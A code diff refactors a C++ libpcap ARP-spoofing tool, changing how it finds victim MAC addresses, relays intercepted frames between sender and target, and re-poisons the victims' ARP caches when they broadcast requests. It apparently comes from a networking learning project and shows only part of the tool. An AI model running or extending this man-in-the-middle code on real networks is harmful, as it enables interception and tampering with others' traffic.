@@ -19,23 +19,16 @@ void usage() {
 
 // get mac addresses thread
 void getMacAddresses(IN pcap_t *handle, OUT ArpSession *arpSession) {
-    MacManager senderMacAddress(arpSession->senderMacAddress);
-    MacManager targetMacAddress(arpSession->targetMacAddress);
-    IpManager  senderIpAddress (arpSession->senderIpAddress);
-    IpManager  targetIpAddress (arpSession->targetIpAddress);
-
     // Get Sender MAC Address
     printf("[*] 1. Get Sender MAC Address\n");
-    getSenderMacAddress(handle, localMacAddress, localIpAddress, senderIpAddress, senderMacAddress);
-    senderMacAddress.printMacAddress("[+] Sender MAC Address : ");
-    memcpy(arpSession->senderMacAddress, senderMacAddress, MacManager::LENGTH);
+    getSenderMacAddress(handle, localMacAddress, localIpAddress, arpSession->senderIpAddress, arpSession->senderMacAddress);
+    arpSession->senderMacAddress.printMacAddress("[+] Sender MAC Address : ");
     printf("\n");
 
     // Get Target MAC Address
     printf("[*] 2. Get Target MAC Address\n");
-    getSenderMacAddress(handle, localMacAddress, localIpAddress, targetIpAddress, targetMacAddress);
-    memcpy(arpSession->targetMacAddress, targetMacAddress, MacManager::LENGTH);
-    targetMacAddress.printMacAddress("[+] Target MAC Address : ");
+    getSenderMacAddress(handle, localMacAddress, localIpAddress, arpSession->targetIpAddress, arpSession->targetMacAddress);
+    arpSession->targetMacAddress.printMacAddress("[+] Target MAC Address : ");
     printf("\n\n");
 }
 
@@ -57,26 +50,23 @@ void relayPacket(IN pcap_t *handle, IN std::vector<ArpSession> arpSessions) {
 
         // relay packet
         for(arpSessionIterator = arpSessions.begin(); arpSessionIterator != arpSessions.end(); arpSessionIterator++) {
-            MacManager sourceMacAddress     (ethernetPacket->sourceMacAddress);
-            MacManager destinationMacAddress(ethernetPacket->sourceMacAddress);
-            MacManager senderMacAddress(arpSessionIterator->senderMacAddress);
-            MacManager targetMacAddress(arpSessionIterator->targetMacAddress);
-
             // Sender -> Target (Sender -> Attacker -> Target)
-            if(sourceMacAddress == senderMacAddress && destinationMacAddress == localMacAddress) { // A -> R -> B
+            if(ethernetPacket->sourceMacAddress      == arpSessionIterator->senderMacAddress
+            && ethernetPacket->destinationMacAddress == localMacAddress) { // A -> R -> B
                 printf("[*] Relay Packet\n");
-                memcpy(ethernetPacket->destinationMacAddress, arpSessionIterator->targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
-                memcpy(ethernetPacket->sourceMacAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+                ethernetPacket->destinationMacAddress = arpSessionIterator->targetMacAddress;
+                ethernetPacket->sourceMacAddress      = localMacAddress;
                 if(pcap_sendpacket(handle, packet, pcapHeader->caplen)) {
                     fprintf(stderr, "[-] Failed to send relay packet\n");
                     break;
                 }
             } else
             // Target -> Sender (Target -> Attacker -> Sender)
-            if(sourceMacAddress == targetMacAddress && destinationMacAddress == localMacAddress) { // A <- R <- B
+            if(ethernetPacket->sourceMacAddress      == arpSessionIterator->targetMacAddress
+            && ethernetPacket->destinationMacAddress == localMacAddress) { // A <- R <- B
                 printf("[*] Relay Packet\n");
-                memcpy(ethernetPacket->destinationMacAddress, arpSessionIterator->targetMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
-                memcpy(ethernetPacket->sourceMacAddress, localMacAddress, ARP_HARDWARE_LENGTH_ETHERNET);
+                ethernetPacket->destinationMacAddress = arpSessionIterator->targetMacAddress;
+                ethernetPacket->sourceMacAddress      = localMacAddress;
                 if(pcap_sendpacket(handle, packet, pcapHeader->caplen)) {
                     fprintf(stderr, "[-] Failed to send relay packet\n");
                     break;
@@ -84,22 +74,22 @@ void relayPacket(IN pcap_t *handle, IN std::vector<ArpSession> arpSessions) {
             // Except partial ARP Packet(refresh arp table)
             } else if(ntohs(ethernetPacket->type) == ETHERNET_TYPE_ARP) {
                 ArpStructure *arpPacket = (ArpStructure *)(packet + sizeof(EthernetStructure));
-                MacManager broadcastMacAddress;
-                broadcastMacAddress.setBroadcast();
 
                 // print packet info
                 printArpPacketInfo(*arpPacket);
 
                 // ARP Request (Sender -> Broadcast)
-                if(sourceMacAddress == senderMacAddress && destinationMacAddress == broadcastMacAddress
-                    && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
+                if(ethernetPacket->sourceMacAddress == arpSessionIterator->senderMacAddress
+                && ethernetPacket->destinationMacAddress.isBroadcast()
+                && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
                     printf("[!] Reinfect Sender\n");
                     sleep(0.1); // wait real ARP reply
                     infectSender(handle, localMacAddress, *arpSessionIterator, 2); // send infect arp packet
                 } else 
                 // ARP Request (Target -> Broadcast)
-                if(sourceMacAddress == targetMacAddress && destinationMacAddress == broadcastMacAddress
-                    && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
+                if(ethernetPacket->sourceMacAddress == arpSessionIterator->targetMacAddress
+                && ethernetPacket->destinationMacAddress.isBroadcast()
+                && ntohs(arpPacket->operationCode) == ARP_OPERATION_REQUEST) {
                     printf("[!] Reinfect Sender\n");
                     sleep(0.1); // wait real ARP reply
                     infectSender(handle, localMacAddress, *arpSessionIterator, 2); // send infect arp packet
@@ -159,12 +149,12 @@ int main(int argc, char* argv[]) {
             fprintf(stderr, "[-] IP Address Format Invalid!\n");
             goto end;
         }
-        memcpy(currentSession.senderIpAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
+        currentSession.senderIpAddress = laddr;
         if(inet_aton(argv[idx+1], &laddr) < 0) {
             fprintf(stderr, "[-] IP Address Format Invalid!\n");
             goto end;
         }
-        memcpy(currentSession.targetIpAddress, &laddr.s_addr, ARP_PROTOCOL_LENGTH_IP);
+        currentSession.targetIpAddress = laddr;
 
         arpSessions.push_back(currentSession);
     }
